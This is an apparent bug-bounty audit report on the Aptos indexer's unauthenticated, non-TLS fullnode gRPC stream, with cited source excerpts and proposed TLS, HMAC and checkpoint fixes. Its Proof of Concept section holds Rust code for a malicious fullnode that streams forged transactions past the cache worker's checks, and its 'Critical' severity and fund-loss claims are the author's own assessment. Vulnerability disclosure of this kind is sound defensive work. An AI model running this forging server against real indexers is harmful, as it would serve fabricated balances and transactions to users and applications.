# Audit Report

## Title
Unauthenticated Fullnode gRPC Messages Enable Blockchain Data Forgery in Indexer Infrastructure

## Summary
The fullnode gRPC protocol lacks message-level authentication (HMAC/signatures) on `StreamStatus` and `TransactionsOutput` messages, and operates without TLS by default. Cache workers accept and store transaction data without cryptographic validation, enabling attackers to inject forged blockchain data into the indexing infrastructure through Man-in-the-Middle (MITM) attacks or malicious fullnodes.

## Finding Description

The Aptos indexer infrastructure uses a gRPC protocol where fullnodes stream blockchain data to cache workers, which then store it in Redis for consumption by indexer APIs. This protocol has three critical security gaps:

**Gap 1: No Message Authentication**

The protobuf messages `StreamStatus` and `TransactionsOutput` contain no authentication tags (HMAC) or digital signatures. [1](#0-0) 

**Gap 2: No Transport Security**

The fullnode gRPC server is configured without TLS encryption. [2](#0-1) 

The client connection function also lacks TLS enforcement. [3](#0-2) 

**Gap 3: Insufficient Validation**

The cache worker only validates `chain_id` and version sequence numbers—it does NOT cryptographically verify transaction signatures, accumulator root hashes, or any Merkle proofs. [4](#0-3) 

Transaction data is accepted and stored directly in Redis without verification. [5](#0-4) 

**Attack Path:**

1. Attacker positions themselves as MITM between cache worker and fullnode (feasible on unencrypted gRPC connection) OR operates a malicious fullnode that cache workers connect to
2. Attacker intercepts legitimate `StreamStatus` INIT message to learn correct `chain_id` (e.g., `chain_id: 1` for mainnet)
3. Attacker forges `TransactionsOutput` messages containing fabricated transactions with:
   - Fake sender addresses and balances
   - Arbitrary `TransactionInfo` hashes (never validated)
   - Fake signatures (never verified)
4. Attacker forges `StreamStatus` BATCH_END messages with sequential version numbers
5. Cache worker accepts forged data (only checks `chain_id` matches and versions are sequential)
6. Forged transactions stored in Redis
7. Downstream indexer APIs serve fake blockchain data to users

**Invariant Violated:** This breaks the **State Consistency** invariant (#4): "State transitions must be atomic and verifiable via Merkle proofs." The indexer infrastructure serves unverified data that cannot be proven to exist on the actual blockchain.

## Impact Explanation

**Severity: Critical**

This vulnerability enables complete compromise of the indexer infrastructure's data integrity, meeting multiple Critical severity criteria from the Aptos bug bounty program:

1. **Data Integrity Violation**: Attackers can inject arbitrary fake blockchain data (transactions, balances, NFT ownership, smart contract events) that will be served to all users of affected indexer APIs and blockchain explorers

2. **Potential Loss of Funds**: Users making financial decisions based on forged data (e.g., seeing fake token balances, fake NFT transfers) could suffer financial losses through:
   - Accepting fake payment confirmations
   - Making trades based on manipulated market data
   - Trusting fake smart contract states

3. **Widespread Impact**: A single compromised fullnode or MITM position affects all downstream consumers:
   - Blockchain explorers displaying fake data
   - DeFi protocols querying indexer APIs
   - Wallets showing incorrect balances
   - Analytics platforms with corrupted datasets

4. **Trust Model Violation**: The architecture assumes fullnodes are trusted data sources, but provides no mechanism to verify this trust cryptographically

The impact is comparable to serving fake data from a compromised database, except it affects critical blockchain infrastructure where data integrity is paramount.

## Likelihood Explanation

**Likelihood: HIGH**

Multiple attack vectors make exploitation realistic:

**Vector 1: Malicious Fullnode (Low barrier)**
- Anyone can run a fullnode and advertise it to indexer operators
- Cache workers configured with malicious fullnode URL immediately serve fake data
- No authentication prevents cache workers from validating fullnode identity
- Operators may use community-run fullnodes to reduce infrastructure costs

**Vector 2: Man-in-the-Middle (Moderate barrier)**
- Unencrypted gRPC traffic enables network-level interception
- Feasible in cloud environments, compromised networks, or BGP hijacking scenarios
- Cache workers often deployed in different datacenters/clouds from fullnodes

**Vector 3: Configuration Error (Low barrier)**
- Documentation shows non-TLS configuration as acceptable. [6](#0-5) 
- No warnings about security implications of non-TLS deployment
- Operators may unknowingly deploy in insecure configuration

**Attack Complexity: LOW**
- Attacker only needs to forge protobuf messages (publicly defined format)
- No cryptographic operations required (no signatures to forge)
- Simple version sequence tracking ensures consistency checks pass
- No rate limiting or anomaly detection on message content

## Recommendation

Implement defense-in-depth with three layers:

**Layer 1: Mandatory TLS (Immediate)**

Configure TLS for all fullnode gRPC servers and require TLS in cache worker clients:

```rust
// In ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs
// Add TLS configuration to bootstrap() function
let tls_config = node_config.indexer_grpc.tls_config.as_ref();
let server = if let Some(tls) = tls_config {
    let cert = tokio::fs::read(&tls.cert_path).await?;
    let key = tokio::fs::read(&tls.key_path).await?;
    let identity = tonic::transport::Identity::from_pem(cert, key);
    Server::builder()
        .tls_config(ServerTlsConfig::new().identity(identity))?
} else {
    return Err("TLS required for indexer gRPC");
};
```

**Layer 2: Message Authentication (Required)**

Add HMAC to each message using a pre-shared key between fullnode and cache worker:

```rust
// Add to TransactionsFromNodeResponse
message TransactionsFromNodeResponse {
    uint32 chain_id = 3;
    bytes message_hmac = 4;  // HMAC-SHA256(key, response_bytes)
    oneof response {
        StreamStatus status = 1;
        TransactionsOutput data = 2;
    }
}
```

Verify HMAC in cache worker before accepting data.

**Layer 3: Cryptographic Data Verification (Defense-in-depth)**

Cache worker should verify transaction accumulator root hashes against trusted checkpoints:

```rust
// In cache worker's process_transactions_from_node_response()
// Verify accumulator root hash matches trusted source
let trusted_root_hash = fetch_trusted_checkpoint(version).await?;
if transaction_info.accumulator_root_hash != trusted_root_hash {
    bail!("Accumulator root hash mismatch - potential forgery");
}
```

Trusted checkpoints can come from:
- Multiple fullnodes (require consensus)
- Validator set signatures on checkpoints
- On-chain light client verification

**Configuration Enforcement:**

Update config validation to reject insecure configurations:

```rust
impl IndexerGrpcConfig {
    pub fn validate(&self) -> Result<()> {
        if self.enabled && self.tls_config.is_none() {
            bail!("TLS is required when indexer_grpc is enabled");
        }
        Ok(())
    }
}
```

## Proof of Concept

**Setup:**
1. Deploy a cache worker configured to connect to fullnode at `http://malicious-fullnode:50051`
2. Attacker runs malicious fullnode that implements the gRPC protocol

**Malicious Fullnode Implementation:**

```rust
// Proof of concept malicious fullnode server
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_server::{FullnodeData, FullnodeDataServer},
    StreamStatus, TransactionsFromNodeResponse, TransactionsOutput,
    stream_status::StatusType, transactions_from_node_response::Response,
    GetTransactionsFromNodeRequest,
};
use tonic::{Request, Response as TonicResponse, Status};
use futures::Stream;
use std::pin::Pin;

pub struct MaliciousFullnode;

#[tonic::async_trait]
impl FullnodeData for MaliciousFullnode {
    type GetTransactionsFromNodeStream = 
        Pin<Box<dyn Stream<Item = Result<TransactionsFromNodeResponse, Status>> + Send>>;

    async fn get_transactions_from_node(
        &self,
        req: Request<GetTransactionsFromNodeRequest>,
    ) -> Result<TonicResponse<Self::GetTransactionsFromNodeStream>, Status> {
        let (tx, rx) = tokio::sync::mpsc::channel(100);
        let starting_version = req.into_inner().starting_version.unwrap_or(0);
        
        tokio::spawn(async move {
            // Send INIT with legitimate chain_id to bypass validation
            let init = TransactionsFromNodeResponse {
                chain_id: 1, // Mainnet chain_id
                response: Some(Response::Status(StreamStatus {
                    r#type: StatusType::Init as i32,
                    start_version: starting_version,
                    end_version: None,
                })),
            };
            tx.send(Ok(init)).await.unwrap();
            
            // Send forged transaction data
            let fake_transaction = create_fake_transaction(starting_version);
            let fake_output = TransactionsFromNodeResponse {
                chain_id: 1,
                response: Some(Response::Data(TransactionsOutput {
                    transactions: vec![fake_transaction],
                })),
            };
            tx.send(Ok(fake_output)).await.unwrap();
            
            // Send BATCH_END with sequential version
            let batch_end = TransactionsFromNodeResponse {
                chain_id: 1,
                response: Some(Response::Status(StreamStatus {
                    r#type: StatusType::BatchEnd as i32,
                    start_version: starting_version,
                    end_version: Some(starting_version),
                })),
            };
            tx.send(Ok(batch_end)).await.unwrap();
        });
        
        Ok(TonicResponse::new(Box::pin(tokio_stream::wrappers::ReceiverStream::new(rx))))
    }
}

fn create_fake_transaction(version: u64) -> aptos_protos::transaction::v1::Transaction {
    // Create transaction with fake data that will bypass cache worker validation
    aptos_protos::transaction::v1::Transaction {
        version,
        // Fake timestamp, fake hashes, fake signature - none verified!
        timestamp: Some(aptos_protos::util::timestamp::Timestamp {
            seconds: 1000000,
            nanos: 0,
        }),
        info: Some(aptos_protos::transaction::v1::TransactionInfo {
            hash: vec![0u8; 32], // Fake hash
            accumulator_root_hash: vec![1u8; 32], // Fake root - not verified!
            ..Default::default()
        }),
        ..Default::default()
    }
}
```

**Verification:**

1. Run malicious fullnode: `cargo run --bin malicious_fullnode`
2. Configure cache worker with `fullnode_grpc_address: http://localhost:50051`
3. Start cache worker: `cargo run --release -- -c config.yaml`
4. Query Redis: Observe forged transactions stored with fake hashes and signatures
5. Query indexer API: Observe fake blockchain data served to clients

**Expected Result:** Forged transactions are accepted, stored, and served without any cryptographic verification, confirming the vulnerability.

## Notes

This vulnerability exists because the indexer infrastructure was designed with an implicit trust assumption that fullnodes always provide honest data. The lack of defense-in-depth means a single compromise point (malicious fullnode or MITM) leads to complete data integrity loss. While the primary blockchain consensus remains secure, the indexer infrastructure—critical for user-facing applications—serves unverified data that cannot be trusted.

### Citations

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.rs (L14-30)
```rust
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct TransactionsOutput {
    #[prost(message, repeated, tag="1")]
    pub transactions: ::prost::alloc::vec::Vec<super::super::super::transaction::v1::Transaction>,
}
#[allow(clippy::derive_partial_eq_without_eq)]
#[derive(Clone, Copy, PartialEq, ::prost::Message)]
pub struct StreamStatus {
    #[prost(enumeration="stream_status::StatusType", tag="1")]
    pub r#type: i32,
    /// Required. Start version of current batch/stream, inclusive.
    #[prost(uint64, tag="2")]
    pub start_version: u64,
    /// End version of current *batch*, inclusive.
    #[prost(uint64, optional, tag="3")]
    pub end_version: ::core::option::Option<u64>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-127)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);

        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
            true => {
                let svc = RawDataServer::new(localnet_data_server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
            },
        };

        let listener = TcpListener::bind(address).await.unwrap();
        if let Some(port_tx) = port_tx {
            port_tx.send(listener.local_addr().unwrap().port()).unwrap();
        }
        let incoming = TcpIncoming::from_listener(listener, false, None).unwrap();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/lib.rs (L36-63)
```rust
pub async fn create_grpc_client(address: Url) -> GrpcClientType {
    backoff::future::retry(backoff::ExponentialBackoff::default(), || async {
        match FullnodeDataClient::connect(address.to_string()).await {
            Ok(client) => {
                tracing::info!(
                    address = address.to_string(),
                    "[Indexer Cache] Connected to indexer gRPC server."
                );
                Ok(client
                    .max_decoding_message_size(usize::MAX)
                    .max_encoding_message_size(usize::MAX)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip)
                    .accept_compressed(CompressionEncoding::Zstd))
            },
            Err(e) => {
                tracing::error!(
                    address = address.to_string(),
                    "[Indexer Cache] Failed to connect to indexer gRPC server: {}",
                    e
                );
                Err(backoff::Error::transient(e))
            },
        }
    })
    .await
    .unwrap()
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L243-275)
```rust
                async move {
                    // Push to cache.
                    match cache_operator_clone
                        .update_cache_transactions(data.transactions)
                        .await
                    {
                        Ok(_) => {
                            log_grpc_step(
                                SERVICE_TYPE,
                                IndexerGrpcStep::CacheWorkerTxnsProcessed,
                                Some(first_transaction_version as i64),
                                Some(last_transaction_version as i64),
                                first_transaction_pb_timestamp.as_ref(),
                                last_transaction_pb_timestamp.as_ref(),
                                Some(cache_update_start_time.elapsed().as_secs_f64()),
                                Some(size_in_bytes),
                                Some(
                                    (last_transaction_version + 1 - first_transaction_version)
                                        as i64,
                                ),
                                None,
                            );
                            Ok(())
                        },
                        Err(e) => {
                            ERROR_COUNT
                                .with_label_values(&["failed_to_update_cache_version"])
                                .inc();
                            bail!("Update cache with version failed: {}", e);
                        },
                    }
                }
            });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-cache-worker/src/worker.rs (L286-324)
```rust
async fn verify_fullnode_init_signal(
    cache_operator: &mut CacheOperator<redis::aio::ConnectionManager>,
    init_signal: TransactionsFromNodeResponse,
    file_store_metadata: FileStoreMetadata,
) -> Result<(ChainID, StartingVersion)> {
    let (fullnode_chain_id, starting_version) = match init_signal
        .response
        .expect("[Indexer Cache] Response type does not exist.")
    {
        Response::Status(status_frame) => {
            match StatusType::try_from(status_frame.r#type)
                .expect("[Indexer Cache] Invalid status type.")
            {
                StatusType::Init => (init_signal.chain_id, status_frame.start_version),
                _ => {
                    bail!("[Indexer Cache] Streaming error: first frame is not INIT signal.");
                },
            }
        },
        _ => {
            bail!("[Indexer Cache] Streaming error: first frame is not siganl frame.");
        },
    };

    // Guaranteed that chain id is here at this point because we already ensure that fileworker did the set up
    let chain_id = cache_operator.get_chain_id().await?.unwrap();
    if chain_id != fullnode_chain_id as u64 {
        bail!("[Indexer Cache] Chain ID mismatch between fullnode init signal and cache.");
    }

    // It's required to start the worker with the same version as file store.
    if file_store_metadata.version != starting_version {
        bail!("[Indexer Cache] Starting version mismatch between filestore metadata and fullnode init signal.");
    }
    if file_store_metadata.chain_id != fullnode_chain_id as u64 {
        bail!("[Indexer Cache] Chain id mismatch between filestore metadata and fullnode.");
    }

    Ok((fullnode_chain_id, starting_version))
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/README.md (L38-41)
```markdown
  * GPRC endpoint with TLS, i.e., https. It's ok to expose tls endpoint only.
  * We introduce it here(in a non mutual-exclusive way) to avoid potential compatibility issue for clients. 
* `data_service_grpc_non_tls_config`: Non-TLS endpoint exposed
  * GRPC endpoint without TLS, i.e., http. It's ok to expose non-tls only.
```
